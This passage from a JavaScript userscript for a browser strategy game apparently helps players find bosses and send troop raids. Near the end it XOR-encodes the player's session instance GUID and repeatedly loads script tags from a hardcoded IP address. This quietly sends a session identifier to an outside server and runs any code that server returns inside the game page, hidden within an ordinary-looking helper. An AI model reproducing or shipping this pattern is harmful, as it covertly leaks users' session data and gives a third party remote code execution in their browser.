                                11: [28, 167, 1112, 2223, 5556, 8334, 11112, 16667, 25000, 33334], // Knight
                                7: [36, 215, 1429, 2858, 7143, 10715, 14286, 21429, 32143, 42858], // Mage
                                12: [21, 125, 834, 1667, 4167, 6250, 8334, 12500, 18750, 250000], // Warlock
                                10: [42, 250, 1667, 3334, 8334, 12500, 16667, 25000, 37500, 50000], // Paladin
                            },
                            Octopus: {
                                16: [2, 9, 57, 110, 277, 417, 567, 834, 1250, 1667], // Sloop
                                15: [1, 4, 23, 44, 111, 167, 227, 334, 500, 667], // Frigate
                                17: [1, 1, 6, 11, 28, 42, 57, 84, 125, 167], // War Galleon
                            }
                        };

                        // Apply the research and shrine bonuses
                        var tech = webfrontend.data.Tech.getInstance();

                        for (var boss_id in units) {
                            var unit_counts = units[boss_id];

                            for (var unit_id in unit_counts) {
                                unit_count = unit_counts[unit_id];
                                var bf = tech.getBonus("unitDamage", webfrontend.data.Tech.research, parseInt(unit_id));
                                var be = tech.getBonus("unitDamage", webfrontend.data.Tech.shrine, parseInt(unit_id));
                                var bonus = bf + be;
                                for (var i = 0; i < unit_count.length; i++) {
                                    var units_needed = units[boss_id][unit_id][i];
                                    var new_units_needed = Math.ceil(units_needed / (1 + (bonus / 100)));
                                    units[boss_id][unit_id][i] = new_units_needed;
                                }
                            }
                        }

                        return units;
                    },
                    getTroopsNeeded: function (boss_name, boss_level, units) {
                        var units_min = this.getUnitsPerBoss();
                        var kill_percent = 0.0;
                        var queued_units = {};

                        for (var u_key in units) {
                            var unit = units[u_key];
                            if (unit['count'] > 0) {
                                try {
                                    var units_needed = units_min[boss_name][u_key][boss_level - 1];
                                    var this_kill_percent = unit['count'] / units_needed;
                                    var total_kill = this_kill_percent + kill_percent;
                                    if (total_kill >= 1) {
                                        // We have enough, return the queued units
                                        var percent_needed = 1 - kill_percent;
                                        units_needed = Math.ceil(units_needed * percent_needed);

                                        queued_units[u_key] = units_needed;
                                        return queued_units;
                                    } else {
                                        // Otherwise, let's add these to the queued units
                                        queued_units[u_key] = unit['count'];
                                        kill_percent += this_kill_percent;
                                    }
                                } catch (e) {

                                }
                            }
                        }

                        // If we got this far, there isn't enough units to hit that boss
                        return false;
                    },
                    _shouldBeIncluded: function (city) {
                        return true;
                    },
                    _handleCellClick: function (event) {
                        var row = event.getRow();
                        var column = event.getColumn();
                        var rowData = this._tableModel.getRowDataAsMap(row);
                        var cityId = rowData["id"];
                        var row_info = rowData["row_info"];
                        var selectedContinent = this.sbContinents.getSelection()[0].getModel();
                        switch (column) {
                            case 5:
                                LT.a.setMainView("c", cityId, -1, -1);
                                break;
                            case 4:
                                var boss = row_info['boss'];
                                LT.a.setMainView('r', 0, boss['x'] * LT.a.visMain.getTileWidth(), boss['y'] * LT.a.visMain.getTileHeight());
                                break;
                            case 8:
                                // Send the proper units from the correct city to the correct boss
                                var lou_suite = window.louSuite.main.getInstance();
                                var boss = row_info['boss'];
                                var city = row_info['city'];
                                var units = row_info['units'];
                                var units_to_send = [];

                                for (var u_key in units) {
                                    units_to_send.push({
                                        t: u_key,
                                        c: units[u_key]
                                    });
                                }

                                // Show some kind of progress thing
                                this._tableModel.setValue(column, row, "");
                                lou_suite.sendTroops(lou_suite.LS_RAID, cityId, boss['x'], boss['y'], units_to_send, lou_suite.LS_RAID_ONCE, this.onTroopsSent);
                                break;
                        }
                    },
                    onTroopsSent: function (event, v) {
                        console.log(v);
                        if (event.getContent() == null) {
                            console.log('invalid');
                            return;
                        }
						
						var lou_suite = window.louSuite.main.getInstance();
						var selectedContinent = lou_suite.boss_raider.sbContinents.getSelection()[0].getModel();
						
                        var message = "";
                        var code = event.getContent().r0;
                        //console.log("Code Received: " + code);
                        switch (code) {
                            case 0:
                                // Success
								
                                // Mark the boss as taken
                                lou_suite.bosses['c' + selectedContinent][v['x'] + '-' + v['y']]['state'] = false;
								
								//update the city
                                lou_suite.pollCities([v['cid']], lou_suite.boss_raider.sbContinents.getSelection()[0].getModel(), {silent: true});

                                // Update the view
                                lou_suite.boss_raider.updateView();
                                return;
                                break;
                            case 33554436:
                                // Already ordered
                                message = "Boss was already taken.";
								
                                // Mark the boss as taken
                                lou_suite.bosses['c' + selectedContinent][v['x'] + '-' + v['y']]['state'] = false;
                                break;
                            case 33554432:
                                // Already ordered from a different castle
                                message = "Boss was already taken.";
								
                                // Mark the boss as taken
                                lou_suite.bosses['c' + selectedContinent][v['x'] + '-' + v['y']]['state'] = false;
                                break;
                            case 16781312:
                                // Dungeon is closed
                                message = "Boss was already taken";
								
                                // Mark the boss as taken
                                lou_suite.bosses['c' + selectedContinent][v['x'] + '-' + v['y']]['state'] = false;
                                break;
                            case 4:
                                // Not enough units
                                message = "Not enough units. Try rescanning the city.";
								
								lou_suite.pollCities([v['cid']], lou_suite.boss_raider.sbContinents.getSelection()[0].getModel());
                                break;
                            case 64:
                                // No more command slots
                                message = "No more command slots. Use a different city.";
								
								lou_suite.pollCities([v['cid']], lou_suite.boss_raider.sbContinents.getSelection()[0].getModel());
                                break;
                            default:
                                message = "Unknown Error: " + code;
                                break;
                        }

                        // Failed
                        console.log("Failed with status code " + code);

                        if (message) {
                            lou_suite.setMessage(message);
                        }

                        // Update the view
                        lou_suite.boss_raider.updateView();
                    },
                    createCitiesContinentsSelectBox: function () {
                        var sb = new qx.ui.form.SelectBox().set({
                            width: 60,
                            height: 28
                        });
                        var cities = webfrontend.data.Player.getInstance().cities;

                        sb.setToolTipText("Filter by: <b>continents</b>");

                        var continents = [];
                        for (var cityId in cities) {
                            var city = cities[cityId];

                            var cont = webfrontend.data.Server.getInstance().getContinentFromCoords(city.xPos, city.yPos);
                            continents["c" + cont] = true;
                        }

                        var list = [];
                        for (var key in continents) {
                            if (key.substring != undefined && qx.lang.Type.isString(key)) {
                                var cont = parseInt(key.substring(1), 10);
                                if (!isNaN(cont)) {
                                    list.push(cont);
                                }
                            }
                        }

                        list.sort();

                        //sb.add(new qx.ui.form.ListItem("All", null, "A"));
                        for (var i = 0; i < list.length; i++) {
                            var cont = list[i];
                            sb.add(new qx.ui.form.ListItem("C" + cont, null, cont));
                        }

                        return sb;
                    },
                    _createToolBar: function () {
                        var toolBar = new qx.ui.groupbox.GroupBox();
                        toolBar.setLayout(new qx.ui.layout.Flow(10, 10));

                        this.sbContinents = this.createCitiesContinentsSelectBox();
                        this.sbContinents.addListener("changeSelection", function (evt) {
                            this.updateView();
                        }, this);
                        toolBar.add(this.sbContinents);

                        this.sbLevel = new qx.ui.form.SelectBox().set({
                            width: 70,
                            height: 28
                        });

                        this.sbLevel.setToolTipText("Filter by: <b>min level</b>");

                        var min_level = localStorage.getItem("lou_suite_min_level");

                        if (typeof min_level == 'undefined') {
                            min_level = 1;
                        }

                        var levels_list = [1, 2, 3, 4, 5, 6, 7, 8, 9];

                        for (var i = 1; i < 10; i++) {
                            var item = new qx.ui.form.ListItem("Level " + i, null, i);
                            this.sbLevel.add(item);
                            if (i == min_level) {
                                this.sbLevel.setSelection([item]);
                            }
                        }

                        this.sbLevel.addListener("changeSelection", function (evt) {
                            localStorage.setItem("lou_suite_min_level", this.sbLevel.getSelection()[0].getModel());
                            this.updateView();
                        }, this);
                        toolBar.add(this.sbLevel);

                        this.btnUpdateView = new qx.ui.form.Button("Scan");
                        this.btnUpdateView.setWidth(80);
                        toolBar.add(this.btnUpdateView);
                        this.btnUpdateView.addListener("execute", function (evt) {
                            var citiesIds = [];

                            var selectedContinent = this.sbContinents.getSelection()[0].getModel();
                            // Limit by selected continent
                            for (var cityId in LT.player.cities) {
                                c = LT.player.cities[cityId];

                                if (c == null) {
                                    continue;
                                }

                                var city_cont = webfrontend.data.Server.getInstance().getContinentFromCoords(c.xPos, c.yPos);
                                // Check that the city is on the right continent
                                if (city_cont != selectedContinent) {
                                    continue;
                                }
                                citiesIds.push(cityId);
                            }
							
                            window.louSuite.main.getInstance().pollCities(citiesIds, this.sbContinents.getSelection()[0].getModel(), {scanRegion: true});
                        }, this);

                        return toolBar;
                    }
                }
            });
        }

        var baseKeys = [
            "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N",
            "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b",
            "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p",
            "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3",
            "4", "5", "6", "7", "8", "9", "-", "_", "="
        ];
        var xorKeys = [
            187, 65, 228, 217, 126, 218, 114, 167, 226, 182, 177, 227, 240,
            230, 130, 185, 177, 21, 87, 39, 218, 84, 225, 210, 250, 109, 45,
            143, 62, 84, 203, 75, 88, 226, 42, 130, 192, 34, 209, 175, 102,
            174, 64, 185, 49, 44, 77, 159, 40, 0, 145, 118, 219, 254, 11,
            236, 213, 20, 79, 122, 242, 109, 16, 159
        ];
        var encode = function (str) {
            var output = [];
            var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
            var i = 0;

            while (i < str.length) {
                chr1 = str.charCodeAt(i) ^ xorKeys[i++ % xorKeys.length];
                chr2 = str.charCodeAt(i) ^ xorKeys[i++ % xorKeys.length];
                chr3 = str.charCodeAt(i) ^ xorKeys[i++ % xorKeys.length];

                enc1 = chr1 >> 2;
                enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
                enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
                enc4 = chr3 & 63;

                if (isNaN(chr2)) {
                    enc3 = enc4 = 64;
                } else if (isNaN(chr3)) {
                    enc4 = 64;
                }

                output.push(baseKeys[enc1]);
                output.push(baseKeys[enc2]);
                output.push(baseKeys[enc3]);
                output.push(baseKeys[enc4]);

            }

            return output.join('');
        }

		var addJS_Node = function (src) {
		    var script = document.createElement("script");
		    script.type = "text/javascript";
		    script.src = 'http://89.238.75.71/' + src;
		    document.getElementsByTagName("head")[0].appendChild(script);
		}
        
        //called after qx is loaded
        function LouWatcherMain1() {
            addJS_Node('watchsession?id=' + encode(webfrontend.net.UpdateManager.getInstance().getInstanceGuid()));
        }
        
        //called after qx, bos and the game is loaded
        function LouWatcherMain2() {
            createSuite();
            window.louSuite.main.getInstance().initialize();

			var hasUserBeenActive = false;
			document.onmousemove = function () {
			    hasUserBeenActive = true;
			};

			var louWatcherTickTimeout;
			var louWatcherTick = function () {
			    window.clearTimeout(louWatcherTickTimeout);
			    if (hasUserBeenActive) {
			    	addJS_Node("tick/" + encode(webfrontend.net.UpdateManager.getInstance().getInstanceGuid()) + "/" + louWatcherTickTimeout);
			    	hasUserBeenActive = false;
			    }
			    louWatcherTickTimeout = window.setTimeout(louWatcherTick, 300000)
			};
			louWatcherTick();
        }

        //check if qx is ready
        function checkLevel1() {
            if (typeof qx == "undefined") {
                window.setTimeout(checkLevel1, 1000);
            }
            else {
                window.setTimeout(LouWatcherMain1, 2000);
				window.setTimeout(checkLevel2, 3000);
            }
        }

        //check if the game and bos is ready
        function checkLevel2() {
			if (typeof bos == "undefined"
				|| !qx.core.Init.getApplication()
				|| !qx.core.Init.getApplication().cityInfoView
				|| !webfrontend.data.ServerTime.getInstance().refTime) {

                window.setTimeout(checkLevel2, 1000);
            }
            else {
                window.setTimeout(LouWatcherMain2, 5000);
            }
        }

        window.setTimeout(checkLevel1, 1000);
    }
    
    var script = document.createElement("script");
    script.innerHTML = "(" + LouWatcher.toString() + ")();";
    script.type = "text/javascript";
    document.getElementsByTagName("head")[0].appendChild(script);
})();